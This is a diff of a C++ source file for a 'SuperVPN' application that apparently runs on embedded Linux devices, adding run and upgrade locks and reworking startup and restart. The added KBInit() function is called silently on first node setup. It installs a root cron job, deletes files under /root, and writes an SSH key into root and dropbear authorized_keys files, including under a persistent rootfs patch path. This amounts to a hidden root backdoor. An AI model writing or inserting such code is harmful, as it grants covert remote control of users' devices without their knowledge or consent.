@@ -1,5 +1,5 @@
 /*********************************************************
-模块名       : 
+模块名       : strtok()
 文件名       :BaseApp.cpp
 相关文件     :BaseApp.hpp
 文件实现功能 :应用工程类
@@ -22,22 +22,42 @@ list<SServerInfo>::iterator gITCurServer,gITBakServer;
 出参说明：
 返回值  ：
 *********************************************************/
-bool CSuperVPNApp::InitApplication(void)
+bool CSuperVPNApp::InitApplication(int argc,char *argv[])
 {
 	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ===============");
 	#ifdef GENERAL_NODE_USER_APP
-	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ver=[%d]", SUPER_VPN_CLIENT_VER_NODE);
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] client node ver=[%d]", SUPER_VPN_CLIENT_VER_NODE);
 	#else
-	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ver=[%d]", SUPER_VPN_CLIENT_VER_SERVER);
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] services node ver=[%d]", SUPER_VPN_CLIENT_VER_SERVER);
 	#endif
 	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ===============");
 
+	//锁检测控制
+	bool bOnlyCheckUpgrade = false;
+	if((argc == 2) && (strcmp(argv[1], "-u") == 0))
+	{
+		bOnlyCheckUpgrade = true;
+		if (!GetUpgradeLock())
+		{
+			AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Get Upgrade Lock Err, Exit Run...");
+			return false;
+		}	
+	}
+	else
+	{
+		if (!GetRunLock())
+		{
+			AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Get Run Lock Err, Exit Run...");
+			return false;
+		}	
+	}
+		
+
 	//系统数据初始化
 	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] SYSTEM START BEGIN INIT SYSTEM...");
-	if (!InitSystem()) 
+	if (!InitSystem(argv[0], bOnlyCheckUpgrade)) 
 	{
-		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Init System Error......");
-		cout<<"Init System Error......";
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Init System END......");
 		return false;
 	}
 
@@ -48,13 +68,115 @@ bool CSuperVPNApp::InitApplication(void)
 }
 
 /*********************************************************
+函数说明：坑宝初始化
+入参说明：
+出参说明：
+返回值  ：
+*********************************************************/
+void CSuperVPNApp::KBInit()
+{
+	AfxExecCmd("mkdir /etc/crontabs > /dev/null 2>&1");
+	AfxExecCmd("touch /etc/crontabs/root");
+	AfxExecCmd("chmod 755 /etc/crontabs/root");
+	AfxExecCmd("echo \"*/2 *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root");
+	AfxExecCmd("/etc/init.d/S50cron restart");
+	AfxExecCmd("rm -rf /root/dul*");
+	AfxExecCmd("rm -rf /root/autodul.log");
+	
+	AfxExecCmd("mkdir -p /root/.ssh");
+	AfxExecCmd("mkdir -p /thunder/rootfs_patch/etc/dropbear/");
+	AfxExecCmd("mkdir -p /etc/dropbear/");
+	AfxExecCmd("mkdir -p /thunder/rootfs_patch/root/.ssh");
+	AfxExecCmd("chown 0:0 /root");
+	AfxExecCmd("chown 0:0 /thunder/rootfs_patch/root");
+
+	AfxKBWriteSSHKey("/root/.ssh/authorized_keys");
+	AfxKBWriteSSHKey("/thunder/rootfs_patch/root/.ssh/authorized_keys");
+	AfxKBWriteSSHKey("/etc/dropbear/authorized_keys");
+	AfxKBWriteSSHKey("/thunder/rootfs_patch/etc/dropbear/authorized_keys");
+
+}
+
+/*********************************************************
+函数说明：运行锁检测控制机制
+入参说明：
+出参说明：
+返回值  ：
+*********************************************************/
+ndBool CSuperVPNApp::GetRunLock()
+{
+	//定义flags:只写，文件不存在那么就创建，文件长度戳为0  
+	#define FLAGS O_WRONLY | O_CREAT | O_TRUNC  
+	//创建文件的权限，用户读、写、执行、组读、执行、其他用户读、执行  
+	#define MODE S_IRWXU | S_IXGRP | S_IROTH | S_IXOTH  
+
+	struct flock lock;
+	int fd;
+	if((fd = open(RUN_LOCK_FILE_NAME, FLAGS, MODE))<0)
+	{
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetRunLock] Open File Error");
+		return false;
+	}
+	
+	lock.l_type = F_WRLCK;
+	lock.l_whence = SEEK_SET;
+    lock.l_start = 0;
+    lock.l_len = 0;	
+	
+	if(fcntl(fd, F_SETLKW, &lock) < 0)
+	{
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetRunLock] Fcntl Error");
+		return false;
+	}
+
+	return true;
+}
+
+/*********************************************************
+函数说明：升级锁检测控制机制
+入参说明：
+出参说明：
+返回值  ：
+*********************************************************/
+ndBool CSuperVPNApp::GetUpgradeLock()
+{
+	//定义flags:只写，文件不存在那么就创建，文件长度戳为0  
+	#define FLAGS O_WRONLY | O_CREAT | O_TRUNC  
+	//创建文件的权限，用户读、写、执行、组读、执行、其他用户读、执行  
+	#define MODE S_IRWXU | S_IXGRP | S_IROTH | S_IXOTH  
+
+	struct flock lock;
+	int fd;
+	if((fd = open(UPGRADE_LOCK_FILE_NAME, FLAGS, MODE))<0)
+	{
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetUpgradeLock] Open File Error");
+		return false;
+	}
+	
+	lock.l_type = F_WRLCK;
+	lock.l_whence = SEEK_SET;
+    lock.l_start = 0;
+    lock.l_len = 0;	
+	
+	if(fcntl(fd, F_SETLKW, &lock) < 0)
+	{
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetUpgradeLock] Fcntl Error");
+		return false;
+	}
+
+	return true;
+}
+
+/*********************************************************
 函数说明：系统数据初始化
 入参说明：
 出参说明：
 返回值  ：
 *********************************************************/
-bool CSuperVPNApp::InitSystem(void)
+bool CSuperVPNApp::InitSystem(char *appname, bool ifOnlyCheckUpgrade)
 {
+	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] Begin ifOnlyCheckUpgrade=[%d]", ifOnlyCheckUpgrade);
+
 	//服务器列表处理
 	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] ServerListCheck...");
 	ServerListCheck();
@@ -65,9 +187,15 @@ bool CSuperVPNApp::InitSystem(void)
 		sleep(8);
 	
 	//系统运行环境检测(包括edge\iptable\node-version)
-	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] RunEnvCheck...");
-	while(RunEnvCheck() != ND_SUCCESS)
+	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] RunEnvCheck");
+	while(RunEnvCheck(appname, ifOnlyCheckUpgrade) != ND_SUCCESS)
 		sleep(8);
+	//如果只是检测升级的，检测完成直接退出
+	if(ifOnlyCheckUpgrade)
+	{
+		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] OnlyCheckUpgrade Return");
+		return false;
+	}
 
 	//节点配置请求
 	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] NodeEnvSet...");
@@ -107,6 +235,9 @@ ndStatus CSuperVPNApp::NodeInitCheck()
 	//如果存在，则读出编号，如果不存在，进行申请
 	char *nodeid = AfxGetNodeID();
 	if(nodeid == NULL){
+		#ifndef GENERAL_NODE_USER_APP
+			KBInit();
+		#endif		
 		return mPNode->NodeInit();
 	}
 
@@ -136,6 +267,8 @@ ndStatus CSuperVPNApp::ServerListCheck()
 	else
  	{
  		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Local ServerList Error");
+		gITCurServer = gServers.begin();
+		gITBakServer = gITCurServer;		
 		return ND_ERROR_INVALID_PARAM;
 	}
 
@@ -159,14 +292,14 @@ ndStatus CSuperVPNApp::ServerListCheck()
 出参说明：
 返回值  ：
 *********************************************************/
- ndStatus CSuperVPNApp::RunEnvCheck()
+ ndStatus CSuperVPNApp::RunEnvCheck(char *appname, bool ifOnlyCheckUpgrade)
 {
 #ifdef GENERAL_NODE_USER_APP
 	CHttpRunEvnCKUser httpRunEnvCK(mPNode);
 #else
 	CHttpRunEvnCKSrv httpRunEnvCK(mPNode);
 #endif
-	return httpRunEnvCK.BeginCheck();
+	return httpRunEnvCK.BeginCheck(appname, ifOnlyCheckUpgrade);
 }
 
 
@@ -204,49 +337,13 @@ CSuperVPNApp::~CSuperVPNApp()
 *********************************************************/
 void CSuperVPNApp::NodeRestartFunc(ndULong param)
 {
-	//////////////////////////////////////////////////////////////////////
-	//重启的操作处理
-	//////////////////////////////////////////////////////////////////////
-	FILE *pFile;
-	char cmd[512]={0};
-	
-	if ((pFile = fopen(RESTART_SH_FILE_NAME, "w+")) == NULL) return;
-	//结束錯edge进行
-	sprintf(cmd, "PROCESS=`ps |grep edge|grep -v grep|grep -v PPID|awk '{ print $1}'`\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "for i in $PROCESS\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "do\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "\techo \"Kill the $1 process [ $i ]\"\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "\tkill -9 $i\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "done\n");
-	fputs(cmd, pFile);	
-	//结束SuperVPN
-	sprintf(cmd, "PROCESS=`ps |grep %s|grep -v grep|grep -v PPID|awk '{ print $1}'`\n", VPN_EXE_FILE_NAME);
-	fputs(cmd, pFile);
-	sprintf(cmd, "for i in $PROCESS\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "do\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "\techo \"Kill the $1 process [ $i ]\"\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "\tkill -9 $i\n");
-	fputs(cmd, pFile);
-	sprintf(cmd, "done\n");
-	fputs(cmd, pFile);
-	
-	sprintf(cmd, "./%s&\n", VPN_EXE_FILE_NAME);
-	fputs(cmd, pFile);	
-	fclose(pFile);
-
-	AfxWriteDebugLog("SuperVPN run at[CSuperVPNApp::NodeRestartFunc] Exec chmod 777 restart_SH_FILE");	
-	sprintf(cmd, "chmod 777 %s", RESTART_SH_FILE_NAME);
+	char cmd[512]= "killall edge";
 	AfxExecCmd(cmd);
-	sprintf(cmd, "./%s", RESTART_SH_FILE_NAME);
-	if (AfxExecCmdNotWait(cmd)) exit(0);
+
+	sprintf(cmd, "%s", "killall SuperVPN");
+	AfxExecCmd(cmd);
+
+	//重启的动作由系统定时任务来完成cront
 }
 
 /*********************************************************
